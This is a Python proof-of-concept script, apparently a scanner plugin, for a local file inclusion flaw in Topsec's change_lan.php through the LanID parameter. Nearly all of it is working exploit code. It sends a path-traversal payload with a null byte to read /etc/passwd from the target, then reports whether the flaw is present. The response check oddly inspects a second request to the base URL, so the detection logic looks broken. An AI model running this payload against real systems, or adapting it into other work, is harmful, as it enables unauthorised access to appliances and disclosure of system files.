#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天融信Topsec change_lan.php本地文件包含
referer: http://www.wooyun.org/bugs/wooyun-2015-0118464
author: Lucifer
description: 文件change_lan.php中,参数LanID存在包含。
'''
import sys
import requests
import warnings
def run(url):
        result = ['天融信Topsec change_lan.php本地文件包含', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/change_lan.php?LanID=../../../../../../../../../etc/passwd%00"
        vulnurl = url + payload
        sess = requests.Session()
        try:
            req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
            req2 = sess.get(url, headers=headers, timeout=10, verify=False)
            if r"root:" in req2.text and r":/bin" in req2.text:
                result[2] = '存在'
                result[1]=vulnurl
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
